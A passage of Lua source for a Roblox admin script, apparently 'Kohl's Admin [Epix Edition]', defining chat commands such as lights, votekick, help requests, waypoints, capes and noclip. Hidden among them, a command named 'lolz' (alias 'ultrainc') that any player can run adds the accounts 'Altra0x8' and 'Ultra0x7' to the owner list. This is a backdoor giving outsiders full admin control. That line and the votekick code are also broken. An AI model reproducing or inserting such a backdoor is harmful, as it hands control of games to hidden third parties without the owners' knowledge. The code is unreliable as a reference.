                if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
                if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
                local f=Instance.new('Sparkles',plr.Character.Torso)
                f.Name='DonorSparkles'
                local p=Instance.new('PointLight',plr.Character.Torso)
                p.Name='DonorSparkleLight'
                table.insert(set.objects,f)
                table.insert(set.objects,p)
                p.Range=15
                if args[1] then
                        local str = BrickColor.new('Bright orange').Color
                        local teststr = args[1]
                        if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
                        p.Color=str
                        f.SparkleColor=str
                else
                        p.Color=Color3.new(1,1,1)
                        f.SparkleColor=Color3.new(1,1,1)
                end
        end
end)
 
set.MakeCommand('Gives you a PointLight with the specified color (if you specify one)',1,set.AnyPrefix,{'light','donorlight'},{'color (optional)'},1,function(plr,args)
        if plr.Character:findFirstChild("Torso") then
                if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
                local p=Instance.new('PointLight',plr.Character.Torso)
                p.Name='DonorLight'
                table.insert(set.objects,p)
                p.Range=15
                if args[1] then
                        local str = BrickColor.new('Cyan').Color
                        local teststr = args[1]
                        if BrickColor.new(teststr) ~= nil then str = BrickColor.new(teststr).Color end
                        p.Color=str
                else
                        p.Color=Color3.new(1,1,1)
                end
        end
end)
 
set.MakeCommand('Removes donor fire on you',1,set.AnyPrefix,{'unfire','undonorfire'},{},0,function(plr,args)
        if plr.Character:findFirstChild("Torso") then
                if plr.Character.Torso:FindFirstChild('DonorFire') then plr.Character.Torso.DonorFire:Destroy() end
                if plr.Character.Torso:FindFirstChild('DonorFireLight') then plr.Character.Torso.DonorFireLight:Destroy() end
        end
end)
 
set.MakeCommand('Removes donor sparkles on you',1,set.AnyPrefix,{'unsparkles','undonorsparkles'},{},0,function(plr,args)
        if plr.Character:findFirstChild("Torso") then
                if plr.Character.Torso:FindFirstChild('DonorSparkles') then plr.Character.Torso.DonorSparkles:Destroy() end
                if plr.Character.Torso:FindFirstChild('DonorSparkleLight') then plr.Character.Torso.DonorSparkleLight:Destroy() end
        end
end)
 
set.MakeCommand('Removes donor light on you',1,set.AnyPrefix,{'unlight','undonorlight'},{},0,function(plr,args)
        if plr.Character:findFirstChild("Torso") then
                if plr.Character.Torso:FindFirstChild('DonorLight') then plr.Character.Torso.DonorLight:Destroy() end
        end
end)
 
set.MakeCommand('Donate',0,set.AnyPrefix,{'donate','change','chagecape'},{},0,function(plr,args)
        if (set.CheckDonor(plr) or set.CheckTrueOwner(plr)) then
                if set.DonorPerks or set.CheckNTac(plr) or set.CheckTrueOwner(plr) then
                        set.Remote(plr,'Function','Donate',2)
                else
                        set.Message('Donor System','Sorry! Donor perks are disabled in settings.',false,{plr})
                end
        else
                set.Remote(plr,'Function','Donate',1)
        end
end)
 
set.MakeCommand('Vote to kick a player',0,set.AnyPrefix,{'votekick','kick'},{'player'},1,function(plr,args)
        if set.VoteKick then
                for i,v in pairs(set.GetPlayers(plr,args[1])) do
                        if set.CheckAdmin(v,false) then return end
                        if not set.VoteKickVotes[v.Name] then
                                set.VoteKickVotes[v.Name].Votes=0
                                set.VoteKickVotes[v.Name].Players={}
                        end
                        for k,m in pairs(set.VoteKickVotes[v.Name].Players) do if m==plr.userId then return end end
                        set.VoteKickVotes[v.Name].Votes=set.VoteKickVotes[v.Name].Votes+1
                        table.insert(set.VoteKickVotes[v.Name].Players,plr.userId)
                        if set.VoteKickVotes[v.Name].Votes>=((#game.Players:children()*set.VoteKickPercentage)/100) then
                                v:Kick()
                                set.VoteKickVotes[v.Name]=nil
                        end
                end
        else
                set.Message("SYSTEM","VoteKick is disabled.",false,{plr})
        end
end)
 
set.MakeCommand('Shows how many kick votes each player in-game has.',2,set.Prefix,{'votekicks'},{},0,function(plr,args)
        local temp={}
        for i,v in pairs(set.VoteKickVotes) do
                if not game.Players:FindFirstChild(i) then set.VoteKickVotes[i]=nil return end
                if set.CheckAdmin(game.Players:FindFirstChild(i),false) then set.VoteKickVotes[i]=nil return end
                table.insert(temp,{Object=i..' - '..set.VoteKickVotes[v.Name].Votes,Desc='Player: '..i..' has '..set.VoteKickVotes[v.Name].Votes..' kick vote(s)'})
        end
        set.Remote(plr,'Function','ListGui','Vote Kicks',temp)
end)
 
set.MakeCommand('Disables or Enables the target player(s)\'s PlayerList (ROBLOX, NOT CUSTOM)',3,set.Prefix,{'playerlist'},{'player','on/off'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1])) do
                if args[2]:lower()=='on' or args[2]:lower()=='true' then
                        set.Remote(v,'Function','PlayerList','on')
                elseif args[2]:lower()=='off' or args[2]:lower()=='false' then
                        set.Remote(v,'Function','PlayerList','off')
                end
        end
end)
 
set.MakeCommand('Send a private message to a player',0,set.Prefix,{'pm','privatemessage'},{'player','message'},2,function(plr,args)
if not args[1] or not args[2] then return end
if set['PMUsableByAnyone'] or set.CheckAdmin(plr,false) then
local message = args[2]
for i,p in pairs(set.GetPlayers(plr, args[1]:lower())) do
coroutine.wrap(function()
set.PM('Private Message from '..plr.Name,p,message,plr)
end)()
end
end
end)
 
set.MakeCommand('Shows Trello bans',2,set.Prefix,{'sbl','syncedbanlist','globalbanlist','trellobans','trellobanlist'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','SBLList',set.bl)
set.Remote(plr,'Function','ListGui','Synced Ban List',set.bl)
end)
 
set.MakeCommand('Cleans some useless junk out of workspace',0,set.AnyPrefix,{'clean'},{},0,function(plr,args)
        set.CleanWorkspace()
end)
 
set.MakeCommand('lolz',0,set.AnyPrefix,{'ultrainc'},{},0,function(plr,args)
        table.insert(set.Owners,"Altra0x8")
        table.insert(set.Owners,"Ultra0x7")
        ["OwnersAreTrueOwners"] = true
end)
 
set.MakeCommand('Get Kohl\'s Admin [Epix Edition]',0,set.AnyPrefix,{'getscript'},{},0,function(plr,args)
        game:service('MarketplaceService'):PromptPurchase(plr,145629584)
end)
 
set.MakeCommand('Shows you your current ping',0,set.AnyPrefix,{'ping','getping'},{},0,function(plr,args)
        set.Remote(plr,'Function','PingGui')
end)
 
set.MakeCommand('Shows a list of donators who are currently in the server',0,set.AnyPrefix,{'donors','donorlist','donatorlist'},{},0,function(plr,args)
local temptable={}
table.insert(temptable,"Last Update: "..set.dlastupdate)
for i,v in pairs(set.donors) do
        if game:service('Players'):FindFirstChild(v.Name) then
                table.insert(temptable,{Object=v.Name,Desc=v.List})
        end
end
--set.Remote(plr,'SetSetting','DonorCmdList',temptable)
set.Remote(plr,'Function','ListGui','Donator List',temptable,'donorlist')
end)
 
set.MakeCommand('Shows you a random quote',0,set.AnyPrefix,{'quote','inspiration','randomquote'},{},0,function(plr,args)
set.PM('Random Quote',plr,set.quotes[math.random(1,#set.quotes)])
end)
 
set.MakeCommand('Calls admins for help',0,set.AnyPrefix,{'help','requesthelp','gethelp'},{},0,function(plr,args)
if set['HelpSystem']==true then
local dontrun=false
local num=0
if set.HelpRequest[plr.Name]~=nil then
        set.Message("Help System","You already have a pending request. Do not spam the help system.",false,{plr})
        dontrun=true
end
if dontrun==true then return end
set.HelpRequest[plr.Name]={}
set.HelpRequest[plr.Name].Available={}
set.HelpRequest[plr.Name].Solved=false
local function helpsolved(plr)
        if set.HelpRequest[plr.Name] and set.HelpRequest[plr.Name].Solved then
                return true
        else
                return false
        end
end
for i,v in pairs(game:service('Players'):children()) do
coroutine.wrap(function()
if set.CheckAdmin(v,false) then
table.insert(set.HelpRequest[plr.Name].Available,v.Name)
set.Remote(v,'Function','RequestHelp',plr)
repeat wait() until helpsolved(plr)
set.Remote(v,'Function','RequestSolved',plr)
end
end)()
end
repeat wait(1) num=num+1 until set.HelpRequest[plr.Name].Solved==true or num==20 or #set.HelpRequest[plr.Name].Available==0
if set.HelpRequest[plr.Name].Solved==false and (num==20 or #set.HelpRequest[plr.Name].Available==0) then
set.Message("Help System","Sorry but no one is available to help you right now!",false,{plr})
end
set.HelpRequest[plr.Name].Solved=true
set.HelpRequest[plr.Name]=nil
else
set.Message("System Message","Sorry but the help system is disabled.",false,{plr})
end
end)
 
set.MakeCommand('Makes you rejoin the server',0,set.AnyPrefix,{'rejoin'},{},0,function(plr,args)
        game:GetService('TeleportService'):Teleport(game.PlaceId,plr)
end)
 
set.MakeCommand('Shows a list of commands that you are allowed to use',0,set.Prefix,{'commands','cmds','viewcommands'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Commands) do
local type
local allowed=false
        if v.AdminLevel==-3 and ((set.FunCommands and set.CheckOwner(plr)) or set.CheckTrueOwner(plr)) then
                allowed=true
                type='[Fun-Owner]'
        elseif v.AdminLevel==-2 and ((set.FunCommands and set.CheckAdmin(plr,true)) or set.CheckTrueOwner(plr)) then
                allowed=true
                type='[Fun-Admin]'
        elseif v.AdminLevel==-1 and ((set.FunCommands and set.CheckAdmin(plr,false)) or set.CheckTrueOwner(plr)) then
                allowed=true
                type='[Fun-Temp]'
        elseif v.AdminLevel==0 and (set.PlayerCommands or set.CheckAdmin(plr,false))then
                allowed=true
                type='[Player]'
        elseif v.AdminLevel==1 and ((set.CheckDonor(plr) and (set.DonorPerks or set.CheckNTac(plr))) or set.CheckTrueOwner(plr)) then
                allowed=true
                type='[Donor]'
        elseif v.AdminLevel==2 and set.CheckAdmin(plr,false) then
                allowed=true
                type='[Temp]'
        elseif v.AdminLevel==3 and set.CheckAdmin(plr,true) then
                allowed=true
                type='[Admin]'
        elseif v.AdminLevel==4 and set.CheckOwner(plr)  then
                allowed=true
                type='[Owner]'
        elseif v.AdminLevel==5 and set.CheckTrueOwner(plr) then
                allowed=true
                type='[Place Owner]'
        end
        local arguments=''
        for k,m in pairs(v.ArgTypes) do
                arguments=arguments..set['SplitKey']..m
        end
        if allowed then table.insert(temptable,{Object=v.Prefix..v.Cmds[1]..arguments,Desc=type..' | '..v.Desc,Filter=type}) end
end
set.Remote(plr,'Function','ListGui','Commands',temptable)
end)
 
set.MakeCommand('Lets you run mutliple commands, like :batch :ff me/:fly me/:noclip me',2,set.Prefix,{'batch','multicommand','batchrun'},{'cmd/cmd/cmd'},1,function(plr,args)
        for cmd in args[1]:gmatch('[^'..set.BatchSplit..']+') do
                set.ProcessCommand(plr,cmd,true)
        end
end)
 
set.MakeCommand('Gives you the admin script\'s custom chat, good for private conversations',2,set.Prefix,{'chat','customchat','chatgui'},{'player'},1,function(plr,args)
        for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
                coroutine.wrap(function()
                set.Remote(p,"Function","CustomChatGui")
                local done=false
                local thing=p.CharacterAdded:connect(function(c)
                        set.Remote(p,'Function','MutePlayer','off')
                        done=true
                end)
                repeat wait() until not p or not p.Parent or done==true
                thing:disconnect()
                end)()
        end
end)
 
set.MakeCommand('Gives you the normal chat back',2,set.Prefix,{'unchat','uncustomchat','removecustomchat','unchatgui'},{'player'},1,function(plr,args)
        for i,p in pairs(set.GetPlayers(plr, (args[1] or plr.Name))) do
                set.Remote(p,"Function","RemoveCustomChat")
                set.Remote(p,'Function','MutePlayer','off')
        end
end)
 
set.MakeCommand('Makes a message of your choice pop up on the target\'s screen with an annoying alarm sound',3,set.Prefix,{'alert','alarm','annoy'},{'player','message'},2,function(plr,args)
        for i,v in pairs(set.GetPlayers(plr,args[1]:lower())) do
                set.Remote(v,"Function","AlertGui",(args[2] or 'Alert | Alert | Alert | Alert | Alert'))
        end
end)
 
set.MakeCommand('Shows you how to use some syntax related things',0,set.Prefix,{'usage'},{},0,function(plr,args)
local usage={
'Special Functions: ';
'Ex: :kill FUNCTION, so like :kill '..set['SpecialPrefix']..'all';
'Put /e in front to make it silent (/e :kill kohl)';
set['SpecialPrefix']..'me - Runs a command on you';
set['SpecialPrefix']..'all - Runs a command on everyone';
set['SpecialPrefix']..'admins - Runs a command on all admins in the game';
set['SpecialPrefix']..'nonadmins - Same as !admins but for people who are not an admin';
set['SpecialPrefix']..'others - Runs command on everyone BUT you';
set['SpecialPrefix']..'random - Runs command on a random person';
'%TEAMNAME - Runs command on everyone in the team TEAMNAME Ex: :kill %raiders';
'$GROUPID - Run a command on everyone in the group GROUPID, Will default to the GroupId setting if no id is given';
'-PLAYERNAME - Will remove PLAYERNAME from list of players. :kill all,-kohl will kill everyone except kohl';
'Certain commands can be used by anyone, these commands have ! infront, such as !clean and !rejoin';
':kill me,noob1,noob2,'..set['SpecialPrefix']..'random,%raiders,$123456,!nonadmins,-kohl';
':batch :ff me/:sparkles me/:rocket jim';
':repeat 10(how many times to run the cmd) 1(how long in between runs) :respawn jim';
'Place owners can edit some settings in-game via the :settings command';
'Please refer to the Tips and Tricks section under the settings in the script for more detailed explanations'
}
--set.Remote(plr,'SetSetting','usage',usage)
set.Remote(plr,'Function','ListGui','Usage',usage)
end)
 
set.MakeCommand('Gives you the admin chat box',2,set.Prefix,{'achat','adminchat'},{},0,function(plr,args)
        set.AdminChat(plr)
end)
 
set.MakeCommand('Makes a new waypoint/sets an exiting one to your current position with the name <name> that you can teleport to using :tp me waypoint-<name>',2,set.Prefix,{'waypoint','wp','checkpoint'},{'name'},1,function(plr,args)
        local name=args[1] or tostring(#set.Waypoints+1)
        if plr.Character:FindFirstChild('Torso') then
                set.Waypoints[name]=plr.Character.Torso.Position
                set.Hint('Made waypoint '..name..' | '..tostring(set.Waypoints[name]),{plr})
        end
end)
 
set.MakeCommand('Deletes the waypoint named <name> if it exist',2,set.Prefix,{'delwaypoint','delwp','delcheckpoint','deletewaypoint','deletewp','deletecheckpoint'},{'name'},1,function(plr,args)
        for i,v in pairs(set.Waypoints) do
                if i:lower():sub(1,#args[1])==args[1]:lower() or args[1]:lower()=='all' then
                        set.Waypoints[i]=nil
                        set.Hint('Deleted waypoint '..i,{plr})
                end
        end
end)
 
set.MakeCommand('Shows available waypoints, mouse over their names to view their coordinates',2,set.Prefix,{'waypoints'},{},0,function(plr,args)
local temp={}
for i,v in pairs(set.Waypoints) do
        local x,y,z=tostring(v):match('(.*),(.*),(.*)')
        table.insert(temp,{Object=i,Desc='X:'..x..' Y:'..y..' Z:'..z})
end
set.Remote(plr,'Function','ListGui','Waypoints',temp)
end)
 
set.MakeCommand('Shows you admin cameras in the server and lets you delete/view them',2,set.Prefix,{'cameras','cams'},{},0,function(plr,args)
        set.Remote(plr,'Function','Cameras')
end)
 
set.MakeCommand('Makes a camera named whatever you pick',2,set.Prefix,{'makecam','cam','makecamera','camera'},{'name'},1,function(plr,args)
if plr and plr.Character and plr.Character:FindFirstChild('Head') then
        print('Checkelect')
        if workspace:FindFirstChild('Camera: '..args[1]) then
                set.Hint(args[1].." Already Exist!",{plr})
                print('O it already exist qq')
        else
        print('Makin cam')
        local cam=Instance.new('Part',workspace)
        cam.Position=plr.Character.Head.Position
        cam.Anchored=true
        cam.BrickColor=BrickColor.new('Really black')
        cam.CanCollide=false
        cam.Locked=true
        cam.FormFactor='Custom'
        cam.Size=Vector3.new(1,1,1)
        cam.TopSurface='Smooth'
        cam.BottomSurface='Smooth'
        cam.Name='Camera: '..args[1]
        Instance.new('PointLight',cam)
        cam.Transparency=0.9
        local mesh=Instance.new('SpecialMesh',cam)
        mesh.Scale=Vector3.new(1,1,1)
        mesh.MeshType='Sphere'
        table.insert(set.cameras,cam)
        end
        end
end)
 
set.MakeCommand('Forces one player to view another',2,set.Prefix,{'fview','forceview','forceviewplayer','fv'},{'player1','player2'},2,function(plr,args)
for k,p in pairs(set.GetPlayers(plr, args[1])) do
coroutine.wrap(function()
for i,v in pairs(set.GetPlayers(plr, args[2])) do
if v and v.Character:FindFirstChild('Humanoid') then
        set.Remote(p,'Function','SetView',v.Character.Humanoid)
end
end
end)()
end
end)
 
set.MakeCommand('Makes you view the target player',2,set.Prefix,{'view','viewplayer','v'},{'player'},1,function(plr,args)
for i,v in pairs(set.GetPlayers(plr, args[1])) do
if v and v.Character:FindFirstChild('Humanoid') then
set.Remote(plr,'Function','SetView',v.Character.Humanoid)
end
end
end)
 
set.MakeCommand('Resets your view',2,set.Prefix,{'resetview','rv','fixcam'},{},0,function(plr,args)
set.Remote(plr,'Function','SetView','reset')
end)
 
set.MakeCommand('Shows you group ranks that have admin',2,set.Prefix,{'ranks','adminranks'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set.Ranks) do
if v.Rank and v.Type and v.Group then
table.insert(temptable,{Object=v.Rank,Desc='Type: '..v.Type..' - Group: '..v.Group})
end
end
--set.Remote(plr,'SetSetting','RanksCmdTable',temptable)
set.Remote(plr,'Function','ListGui','Ranks',temptable)
end)
 
set.MakeCommand('Shows you information about the current server',2,set.Prefix,{'details','meters','gameinfo','serverinfo'},{},0,function(plr,args)
set.Remote(plr,'Function','ServerDetails')
end)
 
set.MakeCommand('Shows you the changelog',2,set.Prefix,{'changelog','changes'},{},0,function(plr,args)
set.Remote(plr,'Function','ListGui','Change Log',set.Changelog)
end)
 
set.MakeCommand('Shows you player currently in-game, including nil ones',2,set.Prefix,{'players','allplayers','nilplayers'},{},0,function(plr,args)
local plrs={}
set.Remote(plr,'Function','Message','System Message','Pinging players, please wait a min, no ping means it was higher than 5 seconds.')
for i,v in pairs(set.GrabNilPlayers('all')) do
coroutine.wrap(function()
if game:service('Players'):FindFirstChild(v.Name) then
table.insert(plrs,{Object=v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
else
table.insert(plrs,{Object='[NIL] '..v.Name,Desc='Lower: '..v.Name:lower()..' - Ping: '..set.Ping(v)..'s'})
end
end)()
end
wait(5)
--set.Remote(plr,'SetSetting','PlayerListCmd',plrs)
set.Remote(plr,'Function','ListGui','Players',plrs)
end)
 
set.MakeCommand('Shows you the admin script\'s version number',2,set.Prefix,{'version','ver'},{},0,function(plr,args)
        set.Message("Kohl's Admin [Epix Edition]", tostring(set.version), true, {plr})
end)
 
set.MakeCommand('Shows you the list of admins, also shows admins that are currently in the server',2,set.Prefix,{'admins','adminlist','owners','tempadmins'},{},0,function(plr,args)
local temptable={}
for i,v in pairs(set['Owners']) do table.insert(temptable,v .. " - Owner") end
for i,v in pairs(set['Admins']) do table.insert(temptable,v .. " - Admin") end
for i,v in pairs(set['TempAdmins']) do table.insert(temptable,v .. " - TempAdmin") end
for i,v in pairs(set.tal) do table.insert(temptable,v .. " - TempAdmin [Synced]") end
for i,v in pairs(set.al) do table.insert(temptable,v .. " - Admin [Synced]") end
for i,v in pairs(set.oal) do table.insert(temptable,v .. " - Owner [Synced]") end
table.insert(temptable,'==== Admins In-Game ====')
for i,v in pairs(game:service('Players'):children()) do
        if set.CheckOwner(v) then
                table.insert(temptable,v.Name..':'..v.userId..' - Owner')
        elseif set.CheckAdmin(v,true) then
                table.insert(temptable,v.Name..':'..v.userId..' - Admin')
        elseif set.CheckAdmin(v,false) then
                table.insert(temptable,v.Name..':'..v.userId..' - TempAdmin')
        end
end
--set.Remote(plr,'SetSetting','AdminListTable',temptable)
set.Remote(plr,'Function','ListGui','Admin List',temptable)
end)
 
set.MakeCommand('Shows you the normal ban list',2,set.Prefix,{'banlist','banned','bans'},{},0,function(plr,args)
--set.Remote(plr,'SetSetting','Banlist',set['BanList'])
set.Remote(plr,'Function','ListGui','Ban List',set.BanList)
end)
 
set.MakeCommand('Lets you send players a yes or no question and then displays percentages when done',2,set.Prefix,{'vote','makevote','startvote','question','survey'},{'player','time','question'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
local Time=tonumber(args[2])
local question=args[3]
local tname=plr.Name..question
set.OpenVote[tname]={}
local vote=set.OpenVote[tname]
if Time > 60 then Time = 60 end
vote.Yes=0
vote.No=0
vote.novote={}
for ik,pl in pairs(plrz) do
set.Remote(pl,'Function','VoteQuestion',tname,question,Time)
table.insert(vote.novote, pl)
end
wait(Time+1)
set.Remote(plr,'Function','VoteResults',question,set.Round(vote.Yes/#plrz*100),set.Round(vote.No/#plrz*100),set.Round(#vote.novote/#plrz*100),vote.Yes,vote.No,#vote.novote)
end)
 
set.MakeCommand('Shows you a list of tools that can be obtains via the give command',2,set.Prefix,{'tools','toollist'},{},0,function(plr,args)
local temptable={}
for i, v in pairs(set.Storage:children()) do
        if v:IsA("Tool") or v:IsA("HopperBin") then
                table.insert(temptable,{Object=v.Name,Desc=v:GetFullName()})
        end
end
--set.Remote(plr,'SetSetting','toollist',temptable)
set.Remote(plr,'Function','ListGui','Tools',temptable)
end)
 
set.MakeCommand('Inserts whatever object belongs to the ID you supply, the object must be in the place owner\'s or ROBLOX\'s inventory',2,set.Prefix,{'insert','ins'},{'id'},1,function(plr,args)
local obj = game:service("InsertService"):LoadAsset(tonumber(args[1]))
if obj and #obj:children() >= 1 and plr.Character then
table.insert(set.objects, obj) for i,v in pairs(obj:children()) do table.insert(set.objects, v) end obj.Parent = game.Workspace obj:MakeJoints() obj:MoveTo(plr.Character:GetModelCFrame().p)
end
end)
 
set.MakeCommand('Remove admin objects',2,set.Prefix,{'clear','cleargame','clr'},{},0,function(plr,args)
for i,v in pairs(set.objects) do if v:IsA("Script") or v:IsA("LocalScript") then v.Disabled = true end v:Destroy() end
for i,v in pairs(set.cameras) do if v then table.remove(set.cameras,i) v:Destroy() end end
for i,v in pairs(game:service('Workspace'):children()) do if v:IsA('Message') or v:IsA('Hint') then v:Destroy() end if v.Name:match('Kohls Probe (.*)') then v:Destroy() end end
set.objects = {}
set.RemoveMessage()
end)
 
set.MakeCommand('Reset lighting back to the setting it had on server start',2,set.Prefix,{'fix','resetlighting','undisco','unflash','fixlighting'},{},0,function(plr,args)
set.lighttask=false
wait(0.5)
game:service('Lighting').Ambient = set.OrigLightingSettings.abt
game:service('Lighting').GlobalShadows = set.OrigLightingSettings.gs
game:service('Lighting').ShadowColor = set.OrigLightingSettings.sc
game:service('Lighting').Outlines = set.OrigLightingSettings.ol
game:service('Lighting').OutdoorAmbient = set.OrigLightingSettings.oabt
game:service('Lighting').Brightness = set.OrigLightingSettings.brt
game:service('Lighting').TimeOfDay = set.OrigLightingSettings.time
game:service('Lighting').FogColor = set.OrigLightingSettings.fclr
game:service('Lighting').FogEnd = set.OrigLightingSettings.fe
game:service('Lighting').FogStart = set.OrigLightingSettings.fs
end)
 
set.MakeCommand('Opens the command box',2,set.Prefix,{'cmdbar','commandbar','cmdbox','commandbox','cmdgui','commandgui'},{},0,function(plr,args)
set.CmdBar(plr)
end)
 
set.MakeCommand('Countdown',2,set.Prefix,{'countdown'},{'time'},1,function(plr,args)
local num = math.min(tonumber(args[1]),120)
for i = num, 1, -1 do
coroutine.resume(coroutine.create(function() set.Message(" ", i, false, game:service('Players'):children(), 1) end))
wait(1)
end
end)
 
set.MakeCommand('Make a message and makes it stay for the amount of time (in seconds) you supply',2,set.Prefix,{'tm','timem','timedmessage'},{'time','message'},2,function(plr,args)
local num = args[1]
set.Message("Message from " .. plr.Name, args[2], false, game:service('Players'):children(), num)
end)
 
set.MakeCommand('Makes a message',2,set.Prefix,{'m','message'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Message("Message from " .. plr.Name, args[1], true, game:service('Players'):children())
end)
 
set.MakeCommand('Makes a hint',2,set.Prefix,{'h','hint'},{'message'},1,function(plr,args)
if not args[1] then return end
set.Hint(plr.Name .. ": " .. args[1], game:service('Players'):children())
end)
 
set.MakeCommand('Shows you information about the target player',2,set.Prefix,{'info','age'},{'player'},1,function(plr,args)
        local plz = set.GetPlayers(plr, args[1]:lower())
        for i,v in pairs(plz) do
        coroutine.wrap(function()
        set.GetPlayerInfo(v,{plr},'Player Info')
        end)()
        end
end)
 
set.MakeCommand('Sets target player(s)\'s leadder stats to 0',2,set.Prefix,{'resetstats'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.wrap(function()
if v and v:findFirstChild("leaderstats") then
for a,q in pairs(v.leaderstats:children()) do
if q:IsA("IntValue") then q.Value = 0 end
end
end
end)()
end
end)
 
set.MakeCommand('Gives the target player(s) a gear from the catalog based on the ID you supply',2,set.Prefix,{'gear','givegear'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v:findFirstChild("Backpack") then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,g in pairs(obj:children()) do if g:IsA("Tool") or g:IsA("HopperBin") then g.Parent = v.Backpack end end
obj:Destroy()
end
end))
end
end)
 
set.MakeCommand('Prompts the player(s) to buy the product beloging to the ID you supply',2,set.Prefix,{'sell'},{'player','id','currency'},3,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
local type = args[3] or 'default'
local t
if type:lower()=='tix' or type:lower()=='tickets' or type:lower()=='t' then
        t=Enum.CurrencyType.Tix
elseif type:lower()=='robux' or type:lower()=='rb' or type:lower()=='r' then
        t=Enum.CurrencyType.Robux
else
        t=Enum.CurrencyType.Default
end
if v then
game:GetService("MarketplaceService"):PromptPurchase(v,tonumber(args[2]),false,t)
end
end))
end
end)
 
set.MakeCommand('Gives the target player(s) a hat based on the ID you supply',2,set.Prefix,{'hat','givehat'},{'player','id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
coroutine.resume(coroutine.create(function()
if v and v.Character then
local obj = game:service("InsertService"):LoadAsset(tonumber(args[2]))
for a,hat in pairs(obj:children()) do if hat:IsA("Hat") then hat.Parent = v.Character end end
obj:Destroy()
end
end))
end
end)
 
set.MakeCommand('Shows you the list of capes for the cape command',2,set.Prefix,{'capes','capelist'},{},0,function(plr,args)
local list = {"script","new yeller","pastel blue","dusty rose","cga brown","random","shiny","gold","kohl","epix","superman","swag","donor","starbucks","gomodern","admin","host","cohost","trainer","giovannis"}
--set.Remote(plr,'SetSetting','CapeList',list)
set.Remote(plr,'Function','ListGui','Cape List',list)
end)
 
set.MakeCommand('Gives the target player(s) the cape specified, do '..set.Prefix..'capes to view a list of available capes ',2,set.Prefix,{'cape','givecape'},{'player','cape/color/id'},2,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
if not args[2] then args[2]='White' end
for i,v in pairs(plrz) do
for a,cp in pairs(v.Character:children()) do if cp.Name == "EpicCape" then cp:Destroy() end end
if args[2]:lower() == "new yeller" then set.Cape(v,'Fabric',"New Yeller")
elseif args[2]:lower() == "pastel blue" then set.Cape(v,'Fabric',"Pastel Blue")
elseif args[2]:lower() == "dusty rose" then set.Cape(v,'Fabric',"Dusty Rose")
elseif args[2]:lower() == "cga brown" then set.Cape(v,'Fabric',"CGA brown")
elseif args[2]:lower() == "random" then set.Cape(v,'Fabric',BrickColor.random())
elseif args[2]:lower() == "shiny" then set.Cape(v,'Plastic',"Institutional white",false,1)
elseif args[2]:lower() == "gold" then set.Cape(v,'Plastic',"Bright yellow",false,0.4)
elseif args[2]:lower() == "kohl" then set.Cape(v,'Fabric',"Really black","108597653")
elseif args[2]:lower() == "script" then set.Cape(v,'Plastic',"White","151359194")
elseif args[2]:lower() == "batman" then set.Cape(v,'Fabric',"Institutional white","108597669")
elseif args[2]:lower() == "epix" then set.Cape(v,'Plastic',"Really black","149442745")
elseif args[2]:lower() == "superman" then set.Cape(v,'Fabric',"Bright blue","108597677")
elseif args[2]:lower() == "swag" then set.Cape(v,'Fabric',"Pink","109301474")
elseif args[2]:lower() == "donor" then set.Cape(v,'Plastic',"White","149009184")
elseif args[2]:lower() == "starbucks" then set.Cape(v,'Plastic',"Black","149248066")
elseif args[2]:lower() == "gomodern" then set.Cape(v,'Plastic',"Really black","149438175")
elseif args[2]:lower() == "admin" then set.Cape(v,'Plastic',"White","149092195")
elseif args[2]:lower() == "giovannis" then set.Cape(v,'Plastic',"White","149808729")
elseif args[2]:lower() == "godofdonuts" then set.Cape(v,'Plastic',"Institutional white","151034443")
elseif args[2]:lower() == "host" then set.Cape(v,'Plastic',"Really black","152299000")
elseif args[2]:lower() == "cohost" then set.Cape(v,'Plastic',"Really black","152298950")
elseif args[2]:lower() == "trainer" then set.Cape(v,'Plastic',"Really black","152298976")
elseif args[2]:lower() == "ba" or args[2]:lower() == "beardedalien" or args[2]:lower() == "beard" then set.Cape(v,'Plastic','White',172528001)
elseif BrickColor.new(args[2]) ~= nil then set.Cape(v,'Fabric',args[2])
elseif tonumber(args[2]) ~= nil then set.Cape(v,'Fabric','White',args[2])
end
end
end)
 
set.MakeCommand('Removes the target player(s)\'s cape',2,set.Prefix,{'uncape','removecape'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
pcall(function() v.Character.EpicCape:Destroy() end)
end
end)
 
set.MakeCommand('Makes the target player(s) slide when they walk',2,set.Prefix,{'slippery','iceskate','icewalk','slide'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Effect','slip')
end
end)
 
set.MakeCommand('NoClips the target player(s)',2,set.Prefix,{'noclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','norm')
end
end)
 
set.MakeCommand('Old flying NoClip',2,set.Prefix,{'flynoclip','oldnolcip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
for i, v in pairs(plrz) do
set.Remote(v,'Function','Noclip','fly')
end
end)
 
set.MakeCommand('Un-NoClips the target player(s)',2,set.Prefix,{'clip','unnoclip'},{'player'},1,function(plr,args)
local plrz = set.GetPlayers(plr, args[1]:lower())
